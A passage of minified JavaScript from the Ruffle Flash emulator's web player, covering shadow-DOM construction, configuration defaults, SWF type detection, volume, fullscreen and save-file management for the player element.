3.9 16 4.85l1.75-11.25h-12.2l.4-2.95h-.05l.7-5.05h-.05q.15-.9.3-1.9.1-.75.25-1.6.15-1.25.35-2.65v-.05q.95-6.7 2.35-16.5h11.25l-3.1 20.8h16.5l4.1-28.05M345 66.35h-.05l1.15-8.2q.5-3-1.75-5.25-1.25-1.25-3-1.75-1-.5-2.25-.5h-27.95q-.65 0-1.3.1-2.5.35-4.7 2.15-2.75 2.25-3.25 5.25l-1.95 14.7v.05l-.05.3 5.85 1.15h-9.45q-1.9.05-3.6 1.35-.2.1-.35.25-1.9 1.55-2.25 3.55l-4.85 34.1q-.25 3 1.75 5.25 1.25 1.4 3 1.95 1.05.3 2.25.3H320q3.25 0 6-2.25 2.75-2 3.25-5l2.75-18.5h-16.5l-1.75 11H302.5l2.1-14.75h.05l.85-6 1.5-11.2q.35 3.8 3.5 6.35 4.6 3.8 15.4 4.8.3 0 .6.05h15.75L345 66.35m-16.4-.95-1.25 8.95h-11.3l.4-2.95h-.05l.7-5.05h-.1l.15-.95h11.45Z"}, Re), Xe = be("svg", undefined, "loading-animation", {xmlns: Re, viewBox: "0 0 66 66"}, Re), Qe = be("circle", undefined, "spinner", {fill: "none", "stroke-width": "6", "stroke-linecap": "round", cx: "33", cy: "33", r: "30"}, Re), en = be("div", undefined, "loadbar"), nn = be("div", undefined, "loadbar-inner"), tn = be("div", "save-manager", "modal hidden"), rn = be("div", "modal-area", "modal-area"), an = be("span", undefined, "close-modal");
    an.textContent = "×";
    const on = be("div", undefined, "general-save-options"), sn = be("span", "backup-saves", "save-option"), ln = be("table", "local-saves"), un = be("div", "volume-controls-modal", "modal hidden"), cn = be("div", undefined, "modal-area"), dn = be("span", undefined, "close-modal");
    dn.textContent = "×";
    const fn = be("div", "volume-controls"), mn = be("h2", "volume-controls-heading"), hn = ke("mute-checkbox-label", "mute-checkbox"), pn = we("checkbox", "mute-checkbox"), vn = be("div", undefined, "slider-container"), gn = ke("volume-slider-label", "volume-slider"), bn = we("range", "volume-slider", "0", "100", "1"), wn = be("span", "volume-slider-text"), kn = be("div", "video-modal", "modal hidden"), yn = be("div", undefined, "modal-area"), xn = be("span", undefined, "close-modal");
    xn.textContent = "×";
    const Rn = be("div", "video-holder"), _n = be("div", "hardware-acceleration-modal", "modal hidden"), zn = be("div", undefined, "modal-area"), Sn = be("span", undefined, "close-modal");
    Sn.textContent = "×";
    const jn = document.createElement("a");
    jn.href = "https://github.com/ruffle-rs/ruffle/wiki/Frequently-Asked-Questions-For-Users#chrome-hardware-acceleration", jn.target = "_blank", jn.className = "acceleration-link", jn.textContent = ve("enable-hardware-acceleration");
    const En = be("div", "context-menu-overlay", "hidden"), Cn = be("ul", "context-menu");
    ye(xe.content, _e), ye(xe.content, ze), ye(xe.content, Se), ye(Se, je), ye(je, Ee), ye(Ee, Ce), ye(Ce, Ae), ye(Ae, Ie), ye(Ie, Fe), ye(Ie, Oe), ye(Ae, De), ye(De, Pe), ye(De, Te), ye(Ce, qe), ye(Se, Me), ye(Me, Be), ye(Me, We), ye(We, Le), ye(Le, $e), ye(Le, Ne), ye(Le, Ue), ye(Le, Ze), ye(Se, He), ye(xe.content, Je), ye(Je, Ve), ye(Ve, Ke), ye(Ke, Ge), ye(Ke, Ye), ye(Je, Xe), ye(Xe, Qe), ye(Je, en), ye(en, nn), ye(xe.content, tn), ye(tn, rn), ye(rn, an), ye(rn, on), ye(on, sn), ye(rn, ln), ye(xe.content, un), ye(un, cn), ye(cn, dn), ye(cn, fn), ye(fn, mn), ye(fn, hn), ye(fn, pn), ye(fn, vn), ye(vn, gn), ye(vn, bn), ye(vn, wn), ye(xe.content, kn), ye(kn, yn), ye(yn, xn), ye(yn, Rn), ye(xe.content, _n), ye(_n, zn), ye(zn, Sn), ye(zn, jn), ye(xe.content, En), ye(En, Cn);
    const An = {};
    function In(e, n) {
      const t = An[e];
      if (undefined !== t) {
        if (t.class !== n) throw new Error("Internal naming conflict on " + e);
        return t.name;
      }
      let r = 0;
      if (undefined !== window.customElements) for (; r < 999;) {
        let t = e;
        if (r > 0 && (t = t + "-" + r), undefined === window.customElements.get(t)) return window.customElements.define(t, n), An[e] = {class: n, name: t, internalName: e}, t;
        r += 1;
      }
      throw new Error("Failed to assign custom element " + e);
    }
    var Fn, On, Dn, Pn, Tn, qn, Mn, Bn, Wn, Ln;
    !function (e) {
      e.On = "on", e.Off = "off", e.Auto = "auto";
    }(Fn || (Fn = {})), function (e) {
      e.Off = "off", e.Fullscreen = "fullscreen", e.On = "on";
    }(On || (On = {})), function (e) {
      e.Visible = "visible", e.Hidden = "hidden";
    }(Dn || (Dn = {})), function (e) {
      e.Error = "error", e.Warn = "warn", e.Info = "info", e.Debug = "debug", e.Trace = "trace";
    }(Pn || (Pn = {})), function (e) {
      e.Window = "window", e.Opaque = "opaque", e.Transparent = "transparent", e.Direct = "direct", e.Gpu = "gpu";
    }(Tn || (Tn = {})), function (e) {
      e.WebGpu = "webgpu", e.WgpuWebgl = "wgpu-webgl", e.Webgl = "webgl", e.Canvas = "canvas";
    }(qn || (qn = {})), function (e) {
      e.On = "on", e.RightClickOnly = "rightClickOnly", e.Off = "off";
    }(Mn || (Mn = {})), function (e) {
      e.AIR = "air", e.FlashPlayer = "flashPlayer";
    }(Bn || (Bn = {})), function (e) {
      e.Allow = "allow", e.Confirm = "confirm", e.Deny = "deny";
    }(Wn || (Wn = {})), function (e) {
      e.All = "all", e.Internal = "internal", e.None = "none";
    }(Ln || (Ln = {}));
    const $n = {allowScriptAccess: false, parameters: {}, autoplay: Fn.Auto, backgroundColor: null, letterbox: On.Fullscreen, unmuteOverlay: Dn.Visible, upgradeToHttps: true, compatibilityRules: true, favorFlash: true, warnOnUnsupportedContent: true, logLevel: Pn.Error, showSwfDownload: false, contextMenu: Mn.On, preloader: true, splashScreen: true, maxExecutionDuration: 15, base: null, menu: true, salign: "", forceAlign: false, quality: "high", scale: "showAll", forceScale: false, frameRate: null, wmode: Tn.Window, publicPath: null, polyfills: true, playerVersion: null, preferredRenderer: null, openUrlMode: Wn.Allow, allowNetworking: Ln.All, openInNewTab: null, socketProxy: [], fontSources: [], defaultFonts: {}, credentialAllowList: [], playerRuntime: Bn.FlashPlayer}, Nn = "application/x-shockwave-flash", Un = "application/futuresplash", Zn = "application/x-shockwave-flash2-preview", Hn = "application/vnd.adobe.flash.movie";
    function Jn(e, n) {
      const t = function (e) {
        let n = "";
        try {
          n = new URL(e, "https://example.com").pathname;
        } catch (e) {}
        if (n && n.length >= 4) {
          const e = n.slice(-4).toLowerCase();
          if (".swf" === e || ".spl" === e) return true;
        }
        return false;
      }(e);
      return n ? function (e, n) {
        switch (e = e.toLowerCase()) {
          case Nn.toLowerCase():
          case Un.toLowerCase():
          case Zn.toLowerCase():
          case Hn.toLowerCase():
            return true;
          default:
            if (n) switch (e) {
              case "application/octet-stream":
              case "binary/octet-stream":
                return true;
            }
        }
        return false;
      }(n, t) : t;
    }
    const Vn = {versionNumber: "0.1.0", versionName: "nightly 2024-01-08", versionChannel: "nightly", buildDate: "2024-01-08T00:15:28.895Z", commitHash: "47db84473a639c405289bb86ce238a83af574137"};
    var Kn = a(297), Gn = a.n(Kn);
    const Yn = "https://ruffle.rs", Xn = /^\s*(\d+(\.\d+)?(%)?)/;
    let Qn = false;
    var et, nt;
    function tt(e) {
      if (null == e) return {};
      e instanceof URLSearchParams || (e = new URLSearchParams(e));
      const n = {};
      for (const [t, r] of e) n[t] = r.toString();
      return n;
    }
    !function (e) {
      e[e.Unknown = 0] = "Unknown", e[e.CSPConflict = 1] = "CSPConflict", e[e.FileProtocol = 2] = "FileProtocol", e[e.InvalidWasm = 3] = "InvalidWasm", e[e.JavascriptConfiguration = 4] = "JavascriptConfiguration", e[e.JavascriptConflict = 5] = "JavascriptConflict", e[e.WasmCors = 6] = "WasmCors", e[e.WasmDownload = 7] = "WasmDownload", e[e.WasmMimeType = 8] = "WasmMimeType", e[e.WasmNotFound = 9] = "WasmNotFound", e[e.WasmDisabledMicrosoftEdge = 10] = "WasmDisabledMicrosoftEdge", e[e.SwfFetchError = 11] = "SwfFetchError", e[e.SwfCors = 12] = "SwfCors";
    }(et || (et = {}));
    class rt {
      constructor(e, n) {
        this.x = e, this.y = n;
      }
      distanceTo(e) {
        const n = e.x - this.x, t = e.y - this.y;
        return Math.sqrt(n * n + t * t);
      }
    }
    class at {
      constructor(e = "#", n = ve("view-error-details")) {
        this.url = e, this.label = n;
      }
    }
    class it extends HTMLElement {
      get readyState() {
        return this._readyState;
      }
      get metadata() {
        return this._metadata;
      }
      constructor() {
        super(), this.contextMenuForceDisabled = false, this.isTouch = false, this.contextMenuSupported = false, this.panicked = false, this.rendererDebugInfo = "", this.longPressTimer = null, this.pointerDownPosition = null, this.pointerMoveMaxDistance = 0, this.config = {}, this.shadow = this.attachShadow({mode: "open"}), this.shadow.appendChild(xe.content.cloneNode(true)), this.dynamicStyles = this.shadow.getElementById("dynamic-styles"), this.staticStyles = this.shadow.getElementById("static-styles"), this.container = this.shadow.getElementById("container"), this.playButton = this.shadow.getElementById("play-button"), this.playButton.addEventListener("click", () => this.play()), this.unmuteOverlay = this.shadow.getElementById("unmute-overlay"), this.splashScreen = this.shadow.getElementById("splash-screen"), this.virtualKeyboard = this.shadow.getElementById("virtual-keyboard"), this.virtualKeyboard.addEventListener("input", this.virtualKeyboardInput.bind(this)), this.saveManager = this.shadow.getElementById("save-manager"), this.videoModal = this.shadow.getElementById("video-modal"), this.hardwareAccelerationModal = this.shadow.getElementById("hardware-acceleration-modal"), this.volumeControls = this.shadow.getElementById("volume-controls-modal"), this.addModalJavaScript(this.saveManager), this.addModalJavaScript(this.volumeControls), this.addModalJavaScript(this.videoModal), this.addModalJavaScript(this.hardwareAccelerationModal), this.volumeSettings = new dt(false, 100), this.addVolumeControlsJavaScript(this.volumeControls);
        const e = this.saveManager.querySelector("#backup-saves");
        e && (e.addEventListener("click", this.backupSaves.bind(this)), e.innerText = ve("save-backup-all"));
        const n = this.unmuteOverlay.querySelector("#unmute-overlay-svg");
        n && (n.querySelector("#unmute-text").textContent = ve("click-to-unmute")), this.contextMenuOverlay = this.shadow.getElementById("context-menu-overlay"), this.contextMenuElement = this.shadow.getElementById("context-menu"), document.documentElement.addEventListener("pointerdown", this.checkIfTouch.bind(this)), this.addEventListener("contextmenu", this.showContextMenu.bind(this)), this.container.addEventListener("pointerdown", this.pointerDown.bind(this)), this.container.addEventListener("pointermove", this.checkLongPressMovement.bind(this)), this.container.addEventListener("pointerup", this.checkLongPress.bind(this)), this.container.addEventListener("pointercancel", this.clearLongPressTimer.bind(this)), this.addEventListener("fullscreenchange", this.fullScreenChange.bind(this)), this.addEventListener("webkitfullscreenchange", this.fullScreenChange.bind(this)), this.instance = null, this.onFSCommand = null, this._readyState = nt.HaveNothing, this._metadata = null, this.lastActivePlayingState = false, this.setupPauseOnTabHidden();
      }
      addModalJavaScript(e) {
        const n = e.querySelector("#video-holder");
        this.container.addEventListener("click", () => {
          e.classList.add("hidden"), n && (n.textContent = "");
        });
        const t = e.querySelector(".modal-area");
        t && t.addEventListener("click", e => e.stopPropagation());
        const r = e.querySelector(".close-modal");
        r && r.addEventListener("click", () => {
          e.classList.add("hidden"), n && (n.textContent = "");
        });
      }
      addVolumeControlsJavaScript(e) {
        const n = e.querySelector("#mute-checkbox"), t = e.querySelector("#volume-slider"), r = e.querySelector("#volume-slider-text"), a = e.querySelector("#volume-controls-heading"), i = e.querySelector("#mute-checkbox-label"), o = e.querySelector("#volume-slider-label");
        a.textContent = ve("volume-controls"), i.textContent = ve("volume-controls-mute"), o.textContent = ve("volume-controls-volume"), n.checked = this.volumeSettings.isMuted, t.disabled = n.checked, t.valueAsNumber = this.volumeSettings.volume, o.style.color = n.checked ? "grey" : "black", r.style.color = n.checked ? "grey" : "black", r.textContent = String(this.volumeSettings.volume), n.addEventListener("change", () => {
          var e;
          t.disabled = n.checked, o.style.color = n.checked ? "grey" : "black", r.style.color = n.checked ? "grey" : "black", this.volumeSettings.isMuted = n.checked, null === (e = this.instance) || undefined === e || e.set_volume(this.volumeSettings.get_volume());
        }), t.addEventListener("input", () => {
          var e;
          r.textContent = t.value, this.volumeSettings.volume = t.valueAsNumber, null === (e = this.instance) || undefined === e || e.set_volume(this.volumeSettings.get_volume());
        });
      }
      setupPauseOnTabHidden() {
        document.addEventListener("visibilitychange", () => {
          this.instance && (document.hidden && (this.lastActivePlayingState = this.instance.is_playing(), this.instance.pause()), document.hidden || true !== this.lastActivePlayingState || this.instance.play());
        }, false);
      }
      get height() {
        return this.getAttribute("height") || "";
      }
      set height (e) {
        this.setAttribute("height", e);
      }
      get width() {
        return this.getAttribute("width") || "";
      }
      set width (e) {
        this.setAttribute("width", e);
      }
      get type() {
        return this.getAttribute("type") || "";
      }
      set type (e) {
        this.setAttribute("type", e);
      }
      connectedCallback() {
        this.updateStyles(), function (e) {
          if (!e.sheet) return;
          !function (e, n) {
            for (const t of n) try {
              e.insertRule(t);
            } catch (e) {}
          }(e.sheet, [":host {\n            all: initial;\n            pointer-events: inherit;\n\n            --ruffle-blue: #37528c;\n            --ruffle-orange: #ffad33;\n\n            display: inline-block;\n            position: relative;\n            /* Default width/height; this will get overridden by user styles/attributes. */\n            width: 550px;\n            height: 400px;\n            font-family: Arial, sans-serif;\n            letter-spacing: 0.4px;\n            touch-action: none;\n            user-select: none;\n            -webkit-user-select: none;\n            -webkit-tap-highlight-color: transparent;\n        }", ":host(:-webkit-full-screen) {\n            display: block;\n            width: 100% !important;\n            height: 100% !important;\n        }", ".hidden {\n            display: none !important;\n        }", "#container,\n        #play-button,\n        #unmute-overlay,\n        #unmute-overlay .background,\n        #panic,\n        #splash-screen,\n        #message-overlay {\n            position: absolute;\n            top: 0;\n            bottom: 0;\n            left: 0;\n            right: 0;\n        }", "#container {\n            overflow: hidden;\n        }", "#container canvas {\n            width: 100%;\n            height: 100%;\n        }", "#play-button,\n        #unmute-overlay {\n            cursor: pointer;\n            display: none;\n        }", "#unmute-overlay .background {\n            background: black;\n            opacity: 0.7;\n        }", "#play-button .icon,\n        #unmute-overlay .icon {\n            position: absolute;\n            top: 50%;\n            left: 50%;\n            width: 50%;\n            height: 50%;\n            max-width: 384px;\n            max-height: 384px;\n            transform: translate(-50%, -50%);\n            opacity: 0.8;\n        }", "#play-button:hover .icon,\n        #unmute-overlay:hover .icon {\n            opacity: 1;\n        }", "#panic {\n            font-size: 20px;\n            text-align: center;\n            background: linear-gradient(180deg, #fd3a40 0%, #fda138 100%);\n            color: white;\n            display: flex;\n            flex-flow: column;\n            justify-content: space-around;\n        }", "#panic a {\n            color: var(--ruffle-blue);\n            font-weight: bold;\n        }", "#panic-title {\n            font-size: xxx-large;\n            font-weight: bold;\n        }", "#panic-body.details {\n            flex: 0.9;\n            margin: 0 10px;\n        }", "#panic-body textarea {\n            width: 100%;\n            height: 100%;\n            resize: none;\n        }", "#panic ul {\n            padding: 0;\n            display: flex;\n            list-style-type: none;\n            justify-content: space-evenly;\n        }", "#message-overlay {\n            position: absolute;\n            background: var(--ruffle-blue);\n            color: var(--ruffle-orange);\n            opacity: 1;\n            z-index: 2;\n            display: flex;\n            align-items: center;\n            justify-content: center;\n            overflow: auto;\n        }", "#message-overlay .message {\n            text-align: center;\n            max-height: 100%;\n            max-width: 100%;\n            padding: 5%;\n            font-size: 20px;\n        }", "#message-overlay p {\n            margin: 0.5em 0;\n        }", "#message-overlay .message div {\n            display: flex;\n            justify-content: center;\n            flex-wrap: wrap;\n            column-gap: 1em;\n        }", "#message-overlay a, #message-overlay button {\n            cursor: pointer;\n            background: var(--ruffle-blue);\n            color: var(--ruffle-orange);\n            border: 2px solid var(--ruffle-orange);\n            font-weight: bold;\n            font-size: 1.25em;\n            border-radius: 0.6em;\n            padding: 10px;\n            text-decoration: none;\n            margin: 2% 0;\n        }", "#message-overlay a:hover, #message-overlay button:hover {\n            background: #ffffff4c;\n        }", "#continue-btn {\n             cursor: pointer;\n             background: var(--ruffle-blue);\n             color: var(--ruffle-orange);\n             border: 2px solid var(--ruffle-orange);\n             font-weight: bold;\n             font-size: 20px;\n             border-radius: 20px;\n             padding: 10px;\n        }", "#continue-btn:hover {\n            background: #ffffff4c;\n        }", "#context-menu-overlay {\n            width: 100%;\n            height: 100%;\n            z-index: 1;\n            position: absolute;\n        }", "#context-menu {\n            color: black;\n            background: #fafafa;\n            border: 1px solid gray;\n            box-shadow: 0px 5px 10px -5px black;\n            position: absolute;\n            font-size: 14px;\n            text-align: left;\n            list-style: none;\n            padding: 0;\n            margin: 0;\n        }", "#context-menu .menu-item {\n            padding: 5px 10px;\n            cursor: pointer;\n            color: black;\n        }", "#context-menu .menu-item.disabled {\n            cursor: default;\n            color: gray;\n        }", "#context-menu .menu-item:not(.disabled):hover {\n            background: lightgray;\n        }", "#context-menu .menu-separator hr {\n            border: none;\n            border-bottom: 1px solid lightgray;\n            margin: 2px;\n        }", "#splash-screen {\n            display: flex;\n            flex-direction: column;\n            background: var(--splash-screen-background, var(--preloader-background, var(--ruffle-blue)));\n            align-items: center;\n            justify-content: center;\n        }", ".loadbar {\n            width: 100%;\n            max-width: 316px;\n            max-height: 10px;\n            height: 20%;\n            background: #253559;\n        }", ".loadbar-inner {\n            width: 0px;\n            max-width: 100%;\n            height: 100%;\n            background: var(--ruffle-orange);\n        }", ".logo {\n            display: var(--logo-display, block);\n            max-width: 380px;\n            max-height: 150px;\n        }", ".loading-animation {\n            max-width: 28px;\n            max-height: 28px;\n            margin-bottom: 2%;\n            width: 10%;\n            aspect-ratio: 1;\n        }", ".spinner {\n            stroke-dasharray: 180;\n            stroke-dashoffset: 135;\n            stroke: var(--ruffle-orange);\n            transform-origin: 50% 50%;\n            animation: rotate 1.5s linear infinite;\n        }", "@keyframes rotate {\n            to {\n                transform: rotate(360deg);\n            }\n        }", "#virtual-keyboard {\n            position: absolute;\n            opacity: 0;\n            top: -100px;\n            width: 1px;\n            height: 1px;\n        }", ".modal {\n            height: inherit;\n            user-select: text;\n        }", ".modal-area {\n            position: sticky;\n            background: white;\n            width: fit-content;\n            padding: 16px 28px 16px 16px;\n            border: 3px solid black;\n            margin: auto;\n        }", "#modal-area {\n            height: 500px;\n            max-height: calc(100% - 38px);\n            min-height: 80px;\n        }", "#restore-save {\n            display: none;\n        }", ".replace-save {\n            display: none;\n        }", ".save-option {\n            display: inline-block;\n            padding: 3px 10px;\n            margin: 5px 2px;\n            cursor: pointer;\n            border-radius: 50px;\n            background-color: var(--ruffle-blue);\n            color: white;\n        }", ".close-modal {\n            position: absolute;\n            top: 5px;\n            right: 10px;\n            cursor: pointer;\n            font-size: x-large;\n        }", ".general-save-options {\n            text-align: center;\n            padding-bottom: 8px;\n            border-bottom: 2px solid #888;\n        }", "#local-saves {\n            border-collapse: collapse;\n            overflow-y: auto;\n            display: block;\n            padding-right: 16px;\n            height: calc(100% - 45px);\n            min-height: 30px;\n        }", "#local-saves td {\n            border-bottom: 1px solid #bbb;\n            height: 30px;\n        }", "#local-saves tr td:nth-child(1) {\n            padding-right: 1em;\n            word-break: break-all;\n        }", "#local-saves tr:nth-child(even) {\n            background-color: #f2f2f2;\n        }", "#video-holder {\n            padding-top: 20px;\n        }", "#video-holder video {\n            max-width: 100%;\n            height: calc(100% - 58px);\n        }", ".slider-container {\n            margin-top: 10px;\n            display: flex;\n            align-items: center;\n        }", "#volume-slider {\n            margin-left: 10px;\n            margin-right: 10px;\n        }", "#volume-slider-text {\n            text-align: right;\n            width: 28px;\n        }", ".acceleration-link {\n            color: var(--ruffle-blue);\n            text-decoration: none;\n        }", ".acceleration-link:hover {\n            text-decoration: underline;\n        }"]);
        }(this.staticStyles);
      }
      static get observedAttributes() {
        return ["width", "height"];
      }
      attributeChangedCallback(e, n, t) {
        "width" !== e && "height" !== e || this.updateStyles();
      }
      disconnectedCallback() {
        this.destroy();
      }
      updateStyles() {
        if (this.dynamicStyles.sheet) {
          if (this.dynamicStyles.sheet.cssRules) for (let e = this.dynamicStyles.sheet.cssRules.length - 1; e >= 0; e--) this.dynamicStyles.sheet.deleteRule(e);
          const e = this.attributes.getNamedItem("width");
          if (null != e) {
            const n = it.htmlDimensionToCssDimension(e.value);
            null !== n && this.dynamicStyles.sheet.insertRule(`:host { width: ${n}; }`);
          }
          const n = this.attributes.getNamedItem("height");
          if (null != n) {
            const e = it.htmlDimensionToCssDimension(n.value);
            null !== e && this.dynamicStyles.sheet.insertRule(`:host { height: ${e}; }`);
          }
        }
      }
      isUnusedFallbackObject() {
        const e = function (e) {
          const n = An[e];
          return undefined !== n ? {internalName: e, name: n.name, class: n.class} : null;
        }("ruffle-object");
        if (null !== e) {
          let n = this.parentNode;
          for (; n !== document && null !== n;) {
            if (n.nodeName === e.name) return true;
            n = n.parentNode;
          }
        }
        return false;
      }
      async ensureFreshInstance() {
        var e, n, t, r, a, i, o, s, l, u, c;
        if (this.destroy(), this.loadedConfig && false !== this.loadedConfig.splashScreen && false !== this.loadedConfig.preloader && this.showSplashScreen(), this.loadedConfig && false === this.loadedConfig.preloader && console.warn("The configuration option preloader has been replaced with splashScreen. If you own this website, please update the configuration."), this.loadedConfig && this.loadedConfig.maxExecutionDuration && "number" != typeof this.loadedConfig.maxExecutionDuration && console.warn("Configuration: An obsolete format for duration for 'maxExecutionDuration' was used, please use a single number indicating seconds instead. For instance '15' instead of '{secs: 15, nanos: 0}'."), this.loadedConfig && "boolean" == typeof this.loadedConfig.contextMenu && console.warn('The configuration option contextMenu no longer takes a boolean. Use "on", "off", or "rightClickOnly".'), this.instance = await h(this.container, this, this.loadedConfig || {}, this.onRuffleDownloadProgress.bind(this)).catch(e => {
          if (console.error(`Serious error loading Ruffle: ${e}`), "file:" === window.location.protocol) e.ruffleIndexError = et.FileProtocol; else {
            e.ruffleIndexError = et.WasmNotFound;
            const n = String(e.message).toLowerCase();
            n.includes("mime") ? e.ruffleIndexError = et.WasmMimeType : n.includes("networkerror") || n.includes("failed to fetch") ? e.ruffleIndexError = et.WasmCors : n.includes("disallowed by embedder") ? e.ruffleIndexError = et.CSPConflict : "CompileError" === e.name ? e.ruffleIndexError = et.InvalidWasm : n.includes("could not download wasm module") && "TypeError" === e.name ? e.ruffleIndexError = et.WasmDownload : "TypeError" === e.name ? e.ruffleIndexError = et.JavascriptConflict : navigator.userAgent.includes("Edg") && n.includes("webassembly is not defined") && (e.ruffleIndexError = et.WasmDisabledMicrosoftEdge);
          }
          throw this.panic(e), e;
        }), null === (e = this.loadedConfig) || undefined === e ? undefined : e.fontSources) for (const e of this.loadedConfig.fontSources) try {
          const n = await fetch(e);
          this.instance.add_font(e, new Uint8Array(await n.arrayBuffer()));
        } catch (n) {
          console.warn(`Couldn't download font source from ${e}`, n);
        }
        (null === (t = null === (n = this.loadedConfig) || undefined === n ? undefined : n.defaultFonts) || undefined === t ? undefined : t.sans) && this.instance.set_default_font("sans", null === (r = this.loadedConfig) || undefined === r ? undefined : r.defaultFonts.sans), (null === (i = null === (a = this.loadedConfig) || undefined === a ? undefined : a.defaultFonts) || undefined === i ? undefined : i.serif) && this.instance.set_default_font("serif", null === (o = this.loadedConfig) || undefined === o ? undefined : o.defaultFonts.serif), (null === (l = null === (s = this.loadedConfig) || undefined === s ? undefined : s.defaultFonts) || undefined === l ? undefined : l.typewriter) && this.instance.set_default_font("typewriter", null === (u = this.loadedConfig) || undefined === u ? undefined : u.defaultFonts.typewriter), this.instance.set_volume(this.volumeSettings.get_volume()), this.rendererDebugInfo = this.instance.renderer_debug_info(), this.rendererDebugInfo.includes("Adapter Device Type: Cpu") && this.container.addEventListener("mouseover", this.openHardwareAccelerationModal.bind(this), {once: true});
        const d = this.instance.renderer_name(), f = this.instance.constructor;
        if (console.log("%cNew Ruffle instance created (Version: " + Vn.versionName + " | WebAssembly extensions: " + (f.is_wasm_simd_used() ? "ON" : "OFF") + " | Used renderer: " + (null != d ? d : "") + ")", "background: #37528C; color: #FFAD33"), "running" !== this.audioState() && (this.container.style.visibility = "hidden", await new Promise(e => {
          window.setTimeout(() => {
            e();
          }, 200);
        }), this.container.style.visibility = ""), this.unmuteAudioContext(), navigator.userAgent.toLowerCase().includes("android") && this.container.addEventListener("click", () => this.virtualKeyboard.blur()), !this.loadedConfig || this.loadedConfig.autoplay === Fn.On || this.loadedConfig.autoplay !== Fn.Off && "running" === this.audioState()) {
          if (this.play(), "running" !== this.audioState()) {
            this.loadedConfig && this.loadedConfig.unmuteOverlay === Dn.Hidden || (this.unmuteOverlay.style.display = "block"), this.container.addEventListener("click", this.unmuteOverlayClicked.bind(this), {once: true});
            const e = null === (c = this.instance) || undefined === c ? undefined : c.audio_context();
            e && (e.onstatechange = () => {
              "running" === e.state && this.unmuteOverlayClicked(), e.onstatechange = null;
            });
          }
        } else this.playButton.style.display = "block";
      }
      onRuffleDownloadProgress(e, n) {
        const t = this.splashScreen.querySelector(".loadbar-inner"), r = this.splashScreen.querySelector(".loadbar");
        Number.isNaN(n) ? r && (r.style.display = "none") : t.style.width = e / n * 100 + "%";
      }
      destroy() {
        this.instance && (this.instance.destroy(), this.instance = null, this._metadata = null, this._readyState = nt.HaveNothing, console.log("Ruffle instance destroyed."));
      }
      checkOptions(e) {
        if ("string" == typeof e) return {url: e};
        const n = (e, n) => {
          if (!e) {
            const e = new TypeError(n);
            throw e.ruffleIndexError = et.JavascriptConfiguration, this.panic(e), e;
          }
        };
        return n(null !== e && "object" == typeof e, "Argument 0 must be a string or object"), n("url" in e || "data" in e, "Argument 0 must contain a `url` or `data` key"), n(!("url" in e) || "string" == typeof e.url, "`url` must be a string"), e;
      }
      async reload() {
        if (!this.loadedConfig) throw new Error("Cannot reload if load wasn't first called");
        await this.load(this.loadedConfig);
      }
      async load(e, n = false) {
        var t, r;
        if (e = this.checkOptions(e), this.isConnected && !this.isUnusedFallbackObject()) {
          if (!ct(this)) try {
            this.loadedConfig = Object.assign(Object.assign(Object.assign(Object.assign(Object.assign({}, $n), n && "url" in e ? {allowScriptAccess: ot("samedomain", e.url)} : {}), null !== (r = null === (t = window.RufflePlayer) || undefined === t ? undefined : t.config) && undefined !== r ? r : {}), this.config), e), this.loadedConfig.backgroundColor && this.loadedConfig.wmode !== Tn.Transparent && (this.container.style.backgroundColor = this.loadedConfig.backgroundColor), await this.ensureFreshInstance(), "url" in e ? (console.log(`Loading SWF file ${e.url}`), this.swfUrl = new URL(e.url, document.baseURI), this.instance.stream_from(this.swfUrl.href, tt(e.parameters))) : "data" in e && (console.log("Loading SWF data"), this.instance.load_data(new Uint8Array(e.data), tt(e.parameters), e.swfFileName || "movie.swf"));
          } catch (e) {
            console.error(`Serious error occurred loading SWF file: ${e}`);
            const n = new Error(e);
            throw n.message.includes("Error parsing config") && (n.ruffleIndexError = et.JavascriptConfiguration), this.panic(n), n;
          }
        } else console.warn("Ignoring attempt to play a disconnected or suspended Ruffle element");
      }
      play() {
        this.instance && (this.instance.play(), this.playButton.style.display = "none");
      }
      get isPlaying() {
        return !!this.instance && this.instance.is_playing();
      }
      get volume() {
        return this.instance ? this.instance.volume() : 1;
      }
      set volume (e) {
        this.instance && this.instance.set_volume(e);
      }
      get fullscreenEnabled() {
        return !(!document.fullscreenEnabled && !document.webkitFullscreenEnabled);
      }
      get isFullscreen() {
        return (document.fullscreenElement || document.webkitFullscreenElement) === this;
      }
      setFullscreen(e) {
        this.fullscreenEnabled && e !== this.isFullscreen && (e ? this.enterFullscreen() : this.exitFullscreen());
      }
      enterFullscreen() {
        const e = {navigationUI: "hide"};
        this.requestFullscreen ? this.requestFullscreen(e) : this.webkitRequestFullscreen ? this.webkitRequestFullscreen(e) : this.webkitRequestFullScreen && this.webkitRequestFullScreen(e);
      }
      exitFullscreen() {
        document.exitFullscreen ? document.exitFullscreen() : document.webkitExitFullscreen ? document.webkitExitFullscreen() : document.webkitCancelFullScreen && document.webkitCancelFullScreen();
      }
      fullScreenChange() {
        var e;
        null === (e = this.instance) || undefined === e || e.set_fullscreen(this.isFullscreen);
      }
      saveFile(e, n) {
        const t = URL.createObjectURL(e), r = document.createElement("a");
        r.href = t, r.style.display = "none", r.download = n, document.body.appendChild(r), r.click(), document.body.removeChild(r), URL.revokeObjectURL(t);
      }
      checkIfTouch(e) {
        this.isTouch = "touch" === e.pointerType || "pen" === e.pointerType;
      }
      base64ToBlob(e, n) {
        const t = atob(e), r = new ArrayBuffer(t.length), a = new Uint8Array(r);
        for (let e = 0; e < t.length; e++) a[e] = t.charCodeAt(e);
        return new Blob([r], {type: n});
      }
      isB64SOL(e) {
        try {
          return "TCSO" === atob(e).slice(6, 10);
        } catch (e) {
          return false;
        }
      }
      confirmReloadSave(e, n, t) {
        if (this.isB64SOL(n) && localStorage[e]) {
          if (!t && !confirm(ve("save-delete-prompt"))) return;
          const r = this.swfUrl ? this.swfUrl.pathname : "", a = this.swfUrl ? this.swfUrl.hostname : document.location.hostname, i = e.split("/").slice(1, -1).join("/");
          if (r.includes(i) && e.startsWith(a)) return void (confirm(ve("save-reload-prompt", {action: t ? "replace" : "delete"})) && this.loadedConfig && (this.destroy(), t ? localStorage.setItem(e, n) : localStorage.removeItem(e), this.reload(), this.populateSaves(), this.saveManager.classList.add("hidden")));
          t ? localStorage.setItem(e, n) : localStorage.removeItem(e), this.populateSaves(), this.saveManager.classList.add("hidden");
        }
      }
      replaceSOL(e, n) {
        const t = e.target, r = new FileReader;
        r.addEventListener("load", () => {
          if (r.result && "string" == typeof r.result) {
            const e = new RegExp("data:.*;base64,"), t = r.result.replace(e, "");
            this.confirmReloadSave(n, t, true);
          }
        }), t && t.files && t.files.length > 0 && t.files[0] && r.readAsDataURL(t.files[0]);
      }
